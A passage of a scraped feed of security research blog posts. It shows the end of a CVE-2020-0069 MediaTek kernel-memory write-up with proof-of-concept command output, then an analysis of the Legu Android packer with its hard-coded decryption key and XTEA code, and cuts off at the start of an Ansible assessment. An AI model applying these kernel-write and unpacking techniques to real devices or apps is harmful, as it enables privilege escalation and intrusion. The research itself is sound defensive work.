address used by the kernel, one can use the device <tt class=\"docutils literal\">/proc/iomem</tt> (root permission needed).</p> \n  <pre class=\"code literal-block\">\n# cat /proc/iomem\n[...]\n40000000-545fffff : System RAM\n  40008000-415fffff : Kernel code\n  41800000-41d669b3 : Kernel data\n[...]\n</pre> \n  <p>These addresses are statically configured and will stay the same over each boot.</p> \n  <p>The PoC is composed of two programs:</p> \n  <blockquote> \n   <ul class=\"simple\"> \n    <li>a C program that allows basic memory read and writes;</li> \n    <li>a shell script that calls the previous program to search the first occurrence of the \"Linux\" string in the kernel data memory and then replaces it by \"minix\".</li> \n   </ul> \n  </blockquote> \n  <pre class=\"code literal-block\">\n$ uname -a\nLinux localhost 4.9.77+ #1 SMP PREEMPT Mon Jan 21 18:32:19 WIB 2019 armv7l\n$ sh poc.sh\n[+] Found Linux string at 0x4180bc00\n[+] Found Linux string at 0x4180bea0\n[+] Write the patched value\n$ uname -a\nminix  4.9.77+ #1 SMP PREEMPT Mon Jan 21 18:32:19 WIB 2019 armv7l\n</pre> \n  <p>Very useful...</p> \n  <p>We have been able to read and write kernel data memory. And we can do the same with any other system memory region, bypassing the permissions and protections in place in the system. So, apart from playing small tricks, it is possible to use this vulnerability to modify any part of the system memory such as kernel code and data in order to achieve a privilege escalation.</p> \n  <p>The binary <tt class=\"docutils literal\"><span class=\"pre\">mtk-su</span></tt> performs a lot of funny things in the kernel memory using this vulnerability to achieve root. We are not going to give more details about these kernel exploitation methods used by <tt class=\"docutils literal\"><span class=\"pre\">mtk-su</span></tt> in this post. However, those who want to know more can have a look to the small tracing library we made. It has to be preloaded when launching <tt class=\"docutils literal\"><span class=\"pre\">mtk-su</span></tt> and it will trace some IOCTLs of the CMDQ driver, such as commands sent to the driver.</p> \n  <pre class=\"code literal-block\">\n$ mkdir mtk-su\n$ LD_PRELOAD=./syscall-hook.so ./mtk-su\nalloc failed\nalloc count=400 startPA=0x5a733000\nuncatched ioctl 40e07803\nexec command (num 0) ( blockSize=8040, readAddress.count=0 ) dumped into cmd-0\nexec command (num 1) ( blockSize=3e0, readAddress.count=1e ) dumped into cmd-1\n[...]\n$ cat mtk-su/cmd-1\nWFE to_wait=1, wait=1, to_update=1, update=0, event=1da\nMOVE 40928000 into reg 17\nREAD  address reg 17, data reg b\n[...]\n</pre> \n  <p>The PoC and the tracer library can be found on the Quarkslab's repository: <a class=\"reference external\" href=\"https://github.com/quarkslab/CVE-2020-0069_poc\">CVE-2020-0069_poc</a>.</p> \n </div> \n</div> \n<div class=\"section\" id=\"conclusion\"> \n <h2>Conclusion</h2> \n <p>This vulnerability is quite critical. It basically allows any application to read and write all the system memory, including the kernel memory. We may wonder why this device driver needs to be accessible to every application and not only to the HAL (<em>Hardware Abstraction Layer</em>) and media-related processes. It would at least add an extra step to achieve root from an application with zero privileges.</p> \n <p>According to the sources of the Fire HD 8 Linux kernel <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id11\" id=\"id5\">[5]</a>, the issue has been fixed by parsing all the commands from the command buffer and by validating each command as well as the addresses and registers in use. For example, only the addresses from the DMA buffer are allowed to be moved to an address register.</p> \n <p>As we are not the ones who discovered this vulnerability, we did not talk with MediaTek about this issue. But from a technical point of view, there is nothing that could have made this vulnerability so long to fix. According to XDA Developers article <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id12\" id=\"id6\">[6]</a>, Mediatek had a fix since May 2019, but it took 10 months to have it widely patched in end-user devices. Thanks to Android license agreement Google has been able to force OEMs to update their devices. This is a great example of patch management complexity in Android ecosystem, where many actors (SoC manufacturers, OEMs, ODMs) have to act together to have a vulnerability fixed on the end-user device. In the end, it seems that only the legal aspects can force all these actors to integrate fixes.</p> \n <p>We might now wonder if all the devices embedding a Mediatek SoC and integrating an AOSP OS version with no Android license agreement will benefit from this fix while their vendors have no legal obligation to integrate it.</p> \n</div> \n<div class=\"section\" id=\"references\"> \n <h2>References</h2> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id7\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id1\">[1]</a></td> \n    <td><a class=\"reference external\" href=\"https://source.android.com/security/bulletin/2020-03-01\">https://source.android.com/security/bulletin/2020-03-01</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id8\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id2\">[2]</a></td> \n    <td><a class=\"reference external\" href=\"https://forum.xda-developers.com/android/development/amazing-temp-root-mediatek-armv8-t3922213\">https://forum.xda-developers.com/android/development/amazing-temp-root-mediatek-armv8-t3922213</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id9\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id3\">[3]</a></td> \n    <td><a class=\"reference external\" href=\"https://www.xda-developers.com/files/2020/03/CVE-2020-0069.png\">https://www.xda-developers.com/files/2020/03/CVE-2020-0069.png</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id10\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id4\">[4]</a></td> \n    <td><a class=\"reference external\" href=\"https://github.com/MiCode/Xiaomi_Kernel_OpenSource/tree/cactus-p-oss\">https://github.com/MiCode/Xiaomi_Kernel_OpenSource/tree/cactus-p-oss</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id11\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id5\">[5]</a></td> \n    <td><a class=\"reference external\" href=\"https://www.amazon.com/gp/help/customer/display.html?tag=androidpolice-20&amp;nodeId=200203720\">https://www.amazon.com/gp/help/customer/display.html?tag=androidpolice-20&amp;nodeId=200203720</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id12\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html#id6\">[6]</a></td> \n    <td><a class=\"reference external\" href=\"https://www.xda-developers.com/mediatek-su-rootkit-exploit/\">https://www.xda-developers.com/mediatek-su-rootkit-exploit/</a></td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<div class=\"section\" id=\"acknowledgements\"> \n <h2>Acknowledgements</h2> \n <p>Many thanks to my colleagues for proofreading this post.</p> \n</div>","descriptionType":"html","publishedDate":"Mon, 23 Mar 2020 23:00:00 +0000","feedId":11110,"bgimg":"http://blog.quarkslab.com/resources/2020-03-23_mediatek-cve-2020-0069/rw_command.png","linkMd5":"b5e122d24638afa80a92a8b4e06af637","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn28@2020_6/2020/08/25/01-15-09-010_c3c72a5c080ab1e2.webp","destWidth":851,"destHeight":494,"sourceBytes":41567,"destBytes":56684,"author":"Maxime Rossi Bellom","articleImgCdnMap":{"http://blog.quarkslab.com/resources/2020-03-23_mediatek-cve-2020-0069/rw_command.png":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn28@2020_6/2020/08/25/01-15-09-010_c3c72a5c080ab1e2.webp","http://blog.quarkslab.com/resources/2020-03-23_mediatek-cve-2020-0069/move_command.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn88@2020_1/2020/08/25/01-15-14-383_23dc65e86cfe1f06.webp","http://blog.quarkslab.com/resources/2020-03-23_mediatek-cve-2020-0069/wfe_command.png":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn70@2020_5/2020/08/25/01-15-12-800_75ff2dfa552fadff.webp"},"publishedOrCreatedDate":1598318092724},{"createdTime":"2020-08-25 09:14:52","updatedTime":"2020-08-25 09:14:52","title":"A Glimpse Into Tencent's Legu Packer","link":"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html","description":"<style> .packedfile { color:green; font-family: 'Lucida Console', monospace; } .keyfile { color: blue; font-family: 'Lucida Console', monospace; } .libshell { color: #FF6347; font-family: 'Lucida Console', monospace; } .tencentclass { color: #df2b04; font-family: 'Lucida Console', monospace; } </style> \n<div class=\"section\" id=\"introduction\"> \n <h2>Introduction</h2> \n <p>This blog post deals with the Legu packer, an Android protector developed by Tencent that is currently one of the state-of-the-art solutions to protect APK DEX files. The packer is updated frequently and this blog post focuses on versions <tt class=\"docutils literal\">4.1.0.15</tt> and <tt class=\"docutils literal\">4.1.0.18</tt>.</p> \n</div> \n<div class=\"section\" id=\"overview\"> \n <h2>Overview</h2> \n <p>An application protected with Legu is composed of two native libraries: <span class=\"libshell\">libshell-super.2019.so</span> and <tt class=\"docutils literal\"><span class=\"pre\">libshella-4.1.0.XY.so</span></tt> as well as raw binary files embedded in the resources of the APK:</p> \n <ul class=\"simple\"> \n  <li><span class=\"keyfile\">tosversion</span></li> \n  <li><span class=\"packedfile\">0OO00l111l1l</span></li> \n  <li><tt class=\"docutils literal\">0OO00oo01l1l</tt></li> \n  <li><tt class=\"docutils literal\">o0oooOO0ooOo.dat</tt></li> \n </ul> \n <p>The main logic of the packer is located in the native library <span class=\"libshell\">libshell-super.2019.so</span> which basically unpacks and loads the protected DEX files from the resources.</p> \n <p>Some functions of the library are obfuscated but thanks to Frida/QBDI their analysis is not a big deal.</p> \n</div> \n<div class=\"section\" id=\"internals\"> \n <h2>Internals</h2> \n <p>Basically, the original DEX files are located in the <span class=\"packedfile\">assets/0OO00l111l1l</span> file along with the information required to unpack them.</p> \n <p>The following figure lays out the structure of this file.</p> \n <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2019-11-26_legu_packer/packed_file.png\" /> \n <p>In the <span class=\"packedfile\">assets/0OO00l111l1l</span> file, the first part contains the original DEX files with the same number of <tt class=\"docutils literal\"><span class=\"pre\">classes&lt;N&gt;.dex</span></tt> according to the multi-DEX feature of the original APK. These DEX files are not exactly the original ones, as their Dalvik bytecode have been <em>NOP-ed</em> by Legu. Therefore, a dump of these files only gives information about the classes' names, not the code logic:</p> \n <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2019-11-26_legu_packer/noped.png\" /> \n <p>Then follows what we called a <em>hashmap</em> that is used to link a class name (e.g. <span class=\"tencentclass\">Lcom/tencent/mmkv/MMKV;</span>) to an offset in the data block located in the third part of the file. This data block contains the original Dalvik bytecode of the methods.</p> \n <p>Actually, the first part that contains the altered DEX files, is compressed with <strong>NRV</strong> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html#id5\" id=\"id1\">[1]</a>. The second part — the hashmap — is also compressed with NRV but the packer adds a layer of encryption through a slightly modified version of <strong>XTEA</strong> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html#id6\" id=\"id2\">[2]</a>. Finally, the last part is compressed and encrypted with the same algorithms as the previous one.</p> \n <p>Regarding the <em>hashmap</em>, it uses a custom structure that has been reversed and lead to a Kaitai structure available here: <a class=\"reference external\" href=\"https://github.com/quarkslab/legu_unpacker_2019/blob/master/legu_packed_file.ksy\">legu_packed_file.ksy</a>, <a class=\"reference external\" href=\"https://github.com/quarkslab/legu_unpacker_2019/blob/master/legu_hashmap.ksy\">legu_hashmap.ksy</a></p> \n <p>Its overall layout is exposed in the next figure:</p> \n <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2019-11-26_legu_packer/hashmap.png\" /> \n <div class=\"section\" id=\"unpacking-process\"> \n  <h3>Unpacking process</h3> \n  <p>Let's say that the application needs to use the packed Java class <span class=\"tencentclass\">Lcom/tencent/mmkv/MMKV;</span>.</p> \n  <p>First, the packer's runtime transforms the class name into an integer with the <tt class=\"docutils literal\">dvmComputeUtf8Hash()</tt> hash function <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html#id7\" id=\"id3\">[3]</a>. This integer is then used as an index into the <em>hashmap</em> whose value is a structure that contains information about the class in the packed data (blue area in the figure). The first attribute of this structure — <tt class=\"docutils literal\">utf8_hash</tt> — is a copy of the hash value which is used to check that it is the right key/value association.</p> \n  <p>The <tt class=\"docutils literal\">class_info</tt> structure (blue block in the figure) next contains the packed method information (yellow area in the figure) whose size is the same as the original number of methods in the class. This structure makes the relationship between the NOP-ed bytecode offset in the altered DEX files and the offset in the original bytecode (red block). Finally, the packer copies the original bytecode into the altered DEX files.</p> \n  <p>To summarize, the first part contains the original DEX files with the Dalvik bytecode removed (<em>NOP-ed</em>). The last part contains the missing Dalvik bytecode and the second part makes the bridge between the altered DEX files and the Dalvik bytecode.</p> \n </div> \n <div class=\"section\" id=\"compression-encryption\"> \n  <h3>Compression &amp; Encryption</h3> \n  <p>To decrypt the hashmap and the Dalvik bytecode, the packer uses the first 16 bytes of <span class=\"keyfile\">assets/tosversion</span> xored with a hard-coded key: <tt class=\"docutils literal\"><span class=\"pre\">^hHc7Ql]N9Z4:+1m~nTcA&amp;3a7|?GB1z@</span></tt>.</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"n\">LIB_KEY</span> <span class=\"o\">=</span> <span class=\"sa\">b</span><span class=\"s2\">\"^hHc7Ql]N9Z4:+1m~nTcA&amp;3a7|?GB1z@\"</span>\n\n<span class=\"k\">def</span> <span class=\"nf\">key_derivation</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">:</span> <span class=\"nb\">bytes</span><span class=\"p\">)</span> <span class=\"o\">-&gt;</span> <span class=\"nb\">bytes</span><span class=\"p\">:</span>\n  <span class=\"k\">return</span> <span class=\"nb\">bytes</span><span class=\"p\">(</span><span class=\"n\">x1</span> <span class=\"o\">^</span> <span class=\"n\">x2</span> <span class=\"k\">for</span> <span class=\"n\">x1</span><span class=\"p\">,</span> <span class=\"n\">x2</span> <span class=\"ow\">in</span> <span class=\"nb\">zip</span><span class=\"p\">(</span><span class=\"n\">LIB_KEY</span><span class=\"p\">,</span> <span class=\"n\">cycle</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">)))</span>\n</pre> \n  </div> \n  <p>Then, it uses a slightly modified version of XTEA that is given in the next listing:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"kt\">int</span> <span class=\"nf\">xtea_decrypt</span><span class=\"p\">(</span><span class=\"kt\">uint32_t</span><span class=\"o\">*</span> <span class=\"n\">key</span><span class=\"p\">,</span> <span class=\"kt\">uint32_t</span><span class=\"o\">*</span> <span class=\"n\">buf</span><span class=\"p\">,</span> <span class=\"kt\">size_t</span> <span class=\"n\">ilen</span><span class=\"p\">,</span> <span class=\"kt\">size_t</span> <span class=\"n\">nb_round</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n  <span class=\"k\">const</span> <span class=\"kt\">size_t</span> <span class=\"n\">count</span> <span class=\"o\">=</span> <span class=\"n\">ilen</span> <span class=\"o\">/</span> <span class=\"mi\">8</span><span class=\"p\">;</span>\n  <span class=\"k\">const</span> <span class=\"kt\">size_t</span> <span class=\"n\">key_off</span> <span class=\"o\">=</span> <span class=\"p\">(</span><span class=\"n\">ilen</span> <span class=\"o\">&amp;</span> <span class=\"mi\">8</span><span class=\"p\">)</span> <span class=\"o\">/</span> <span class=\"mi\">4</span><span class=\"p\">;</span>\n  <span class=\"k\">static</span> <span class=\"k\">constexpr</span> <span class=\"kt\">uint32_t</span> <span class=\"n\">DELTA</span> <span class=\"o\">=</span> <span class=\"mh\">0x9e3779b9</span><span class=\"p\">;</span>\n\n  <span class=\"k\">const</span> <span class=\"kt\">uint32_t</span> <span class=\"n\">key_0</span> <span class=\"o\">=</span> <span class=\"n\">key</span><span class=\"p\">[</span><span class=\"n\">key_off</span> <span class=\"o\">+</span> <span class=\"mi\">0</span><span class=\"p\">];</span>\n  <span class=\"k\">const</span> <span class=\"kt\">uint32_t</span> <span class=\"n\">key_1</span> <span class=\"o\">=</span> <span class=\"n\">key</span><span class=\"p\">[</span><span class=\"n\">key_off</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">];</span>\n\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kt\">size_t</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">count</span> <span class=\"o\">*</span> <span class=\"mi\">2</span><span class=\"p\">;</span> <span class=\"n\">i</span> <span class=\"o\">+=</span> <span class=\"mi\">2</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"n\">buf</span><span class=\"p\">[</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">^=</span> <span class=\"n\">key_0</span><span class=\"p\">;</span>\n    <span class=\"n\">buf</span><span class=\"p\">[</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">]</span> <span class=\"o\">^=</span> <span class=\"n\">key_1</span><span class=\"p\">;</span>\n\n    <span class=\"kt\">uint32_t</span> <span class=\"n\">sum</span> <span class=\"o\">=</span> <span class=\"n\">DELTA</span> <span class=\"o\">*</span> <span class=\"n\">nb_round</span><span class=\"p\">;</span>\n    <span class=\"kt\">uint32_t</span> <span class=\"n\">temp0</span> <span class=\"o\">=</span> <span class=\"n\">buf</span><span class=\"p\">[</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"mi\">0</span><span class=\"p\">];</span>\n    <span class=\"kt\">uint32_t</span> <span class=\"n\">temp1</span> <span class=\"o\">=</span> <span class=\"n\">buf</span><span class=\"p\">[</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">];</span>\n\n    <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"kt\">size_t</span> <span class=\"n\">j</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span> <span class=\"n\">j</span> <span class=\"o\">&lt;</span> <span class=\"n\">nb_round</span><span class=\"p\">;</span> <span class=\"o\">++</span><span class=\"n\">j</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n      <span class=\"n\">temp1</span> <span class=\"o\">-=</span> <span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">[</span><span class=\"mi\">2</span><span class=\"p\">]</span> <span class=\"o\">+</span> <span class=\"p\">(</span><span class=\"n\">temp0</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">4</span><span class=\"p\">))</span> <span class=\"o\">^</span> <span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">[</span><span class=\"mi\">3</span><span class=\"p\">]</span> <span class=\"o\">+</span> <span class=\"p\">(</span><span class=\"n\">temp0</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mi\">5</span><span class=\"p\">))</span> <span class=\"o\">^</span> <span class=\"p\">(</span><span class=\"n\">temp0</span> <span class=\"o\">+</span> <span class=\"n\">sum</span><span class=\"p\">);</span>\n      <span class=\"n\">temp0</span> <span class=\"o\">-=</span> <span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">+</span> <span class=\"p\">(</span><span class=\"n\">temp1</span> <span class=\"o\">&lt;&lt;</span> <span class=\"mi\">4</span><span class=\"p\">))</span> <span class=\"o\">^</span> <span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]</span> <span class=\"o\">+</span> <span class=\"p\">(</span><span class=\"n\">temp1</span> <span class=\"o\">&gt;&gt;</span> <span class=\"mi\">5</span><span class=\"p\">))</span> <span class=\"o\">^</span> <span class=\"p\">(</span><span class=\"n\">temp1</span> <span class=\"o\">+</span> <span class=\"n\">sum</span><span class=\"p\">);</span>\n      <span class=\"n\">sum</span> <span class=\"o\">-=</span> <span class=\"n\">DELTA</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"n\">buf</span><span class=\"p\">[</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">temp0</span><span class=\"p\">;</span>\n    <span class=\"n\">buf</span><span class=\"p\">[</span><span class=\"n\">i</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">temp1</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">return</span> <span class=\"mi\">0</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n</pre> \n  </div> \n  <p>After the decryption routine, the packer decompresses the data with <tt class=\"docutils literal\">NRV</tt>, the same algorithm used to compress the altered DEX files:</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"n\">key_derivation</span><span class=\"p\">(</span><span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"s2\">\"assets/tosversion\"</span><span class=\"p\">,</span> <span class=\"s2\">\"rb\"</span><span class=\"p\">)</span><span class=\"o\">.</span><span class=\"n\">read</span><span class=\"p\">()[:</span><span class=\"mi\">16</span><span class=\"p\">])</span>\n<span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"n\">nb_dex_files</span><span class=\"p\">):</span>\n  <span class=\"n\">hashmap</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span>          <span class=\"o\">=</span> <span class=\"n\">nrv_decompress</span><span class=\"p\">(</span><span class=\"n\">xtea_decrypt</span><span class=\"p\">(</span><span class=\"n\">blob1</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">))</span>\n  <span class=\"n\">dalvik_bytecodes</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">nrv_decompress</span><span class=\"p\">(</span><span class=\"n\">xtea_decrypt</span><span class=\"p\">(</span><span class=\"n\">blob2</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">))</span>\n</pre> \n  </div> \n </div> \n</div> \n<div class=\"section\" id=\"unpacking\"> \n <h2>Unpacking</h2> \n <p>Putting all the pieces together, we can <strong>statically</strong> unpack protected APKs and recover the original bytecode:</p> \n <img alt=\"\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2019-11-26_legu_packer/unpacked.png\" /> \n <p>Hence, as we can automatically unpack such APKs, the unpacking process could be integrated into an automatic analysis pipeline.</p> \n <p>The script and the Kaitai structures are available on the Quarkslab's repository: <a class=\"reference external\" href=\"https://github.com/quarkslab/legu_unpacker_2019\">legu_unpacker_2019</a>, along with a suspicious application <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html#id8\" id=\"id4\">[4]</a>, <a class=\"reference external\" href=\"https://github.com/quarkslab/legu_unpacker_2019/blob/master/samples/com.intotherain.voicechange.apk\">packed</a> and <a class=\"reference external\" href=\"https://github.com/quarkslab/legu_unpacker_2019/blob/master/samples/com.intotherain.voicechange_unpacked.apk\">unpacked</a>.</p> \n</div> \n<div class=\"section\" id=\"acknowledgments\"> \n <h2>Acknowledgments</h2> \n <p>Thanks to my colleagues who proofread this article.</p> \n</div> \n<div class=\"section\" id=\"references\"> \n <h2>References</h2> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id5\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html#id1\">[1]</a></td> \n    <td><a class=\"reference external\" href=\"http://www.oberhumer.com/opensource/ucl/\">http://www.oberhumer.com/opensource/ucl/</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id6\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html#id2\">[2]</a></td> \n    <td><a class=\"reference external\" href=\"https://en.wikipedia.org/wiki/XTEA\">https://en.wikipedia.org/wiki/XTEA</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id7\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html#id3\">[3]</a></td> \n    <td><a class=\"reference external\" href=\"http://androidxref.com/4.4.4_r1/xref/dalvik/vm/UtfString.cpp#88\">http://androidxref.com/4.4.4_r1/xref/dalvik/vm/UtfString.cpp#88</a></td> \n   </tr> \n  </tbody> \n </table> \n <table class=\"docutils footnote\" frame=\"void\" id=\"id8\" rules=\"none\"> \n  <colgroup> \n   <col class=\"label\" /> \n   <col /> \n  </colgroup> \n  <tbody valign=\"top\"> \n   <tr> \n    <td class=\"label\"><a class=\"fn-backref\" href=\"http://blog.quarkslab.com/a-glimpse-into-tencents-legu-packer.html#id4\">[4]</a></td> \n    <td><a class=\"reference external\" href=\"https://www.virustotal.com/gui/file/708e6967920dcf2789b7183d714e73ab79a2f8b3ca71929b12aadeb2c58c2867/detection\">https://www.virustotal.com/gui/file/708e6967920dcf2789b7183d714e73ab79a2f8b3ca71929b12aadeb2c58c2867/detection</a></td> \n   </tr> \n  </tbody> \n </table> \n</div>","descriptionType":"html","publishedDate":"Mon, 25 Nov 2019 23:00:00 +0000","feedId":11110,"bgimg":"http://blog.quarkslab.com/resources/2019-11-26_legu_packer/packed_file.png","linkMd5":"41cd2e745dd1c20533633d789273ed24","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn61@2020_4/2020/08/25/01-15-09-485_4126435602f9a45d.webp","destWidth":804,"destHeight":473,"sourceBytes":288249,"destBytes":25554,"author":"Romain Thomas","articleImgCdnMap":{"http://blog.quarkslab.com/resources/2019-11-26_legu_packer/packed_file.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn61@2020_4/2020/08/25/01-15-09-485_4126435602f9a45d.webp","http://blog.quarkslab.com/resources/2019-11-26_legu_packer/noped.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn71@2020_1/2020/08/25/01-15-17-919_749b33323926d0b1.webp","http://blog.quarkslab.com/resources/2019-11-26_legu_packer/hashmap.png":"https://cdn.jsdelivr.net/gh/myreaderx29/cdn80@2020_1/2020/08/25/01-15-14-747_cbc1aea05726f8fe.webp","http://blog.quarkslab.com/resources/2019-11-26_legu_packer/unpacked.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn100@2020_1/2020/08/25/01-15-15-123_6ad1ba4fe7d9d549.webp"},"publishedOrCreatedDate":1598318092719},{"createdTime":"2020-08-25 09:14:52","updatedTime":"2020-08-25 09:14:52","title":"Ansible Security Assessment","link":"http://blog.quarkslab.com/ansible-security-assessment.html","description":"<div class=\"section\" id=\"introduction\"> \n <h2>Introduction</h2> \n <p><tt class=\"docutils literal\">Ansible</tt> <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id44\" id=\"id1\">[1]</a> is an open-source software that automates configuration management and software deployment. If you're not familiar with <tt class=\"docutils literal\">Ansible</tt>, we encourage you to read this introduction first <a class=\"footnote-reference\" href=\"http://blog.quarkslab.com/ansible-security-assessment.html#id58\" id=\"id2\">[15]</a>.</p> \n <p><tt class=\"docutils literal\">Ansible</tt> works by connecting to the infrastructure machines (which can be a <tt class=\"docutils literal\">Windows</tt> or <tt class=\"docutils literal\">Linux</tt> OS) and uploading small pieces of code to them. These programs are called \"Ansible Modules\" and are executed by <tt class=\"docutils literal\">Ansible</tt> to modify the state of the system.</p> \n <p>Each of these modules represent a task to be executed on the node and a collection of tasks is a playbook.</p> \n <p>To manage the remote machines (also called <em>nodes</em>), <tt class=\"docutils literal\">Ansible</tt> uses <tt class=\"docutils literal\">SSH</tt> (or Windows Remote Management <tt class=\"docutils 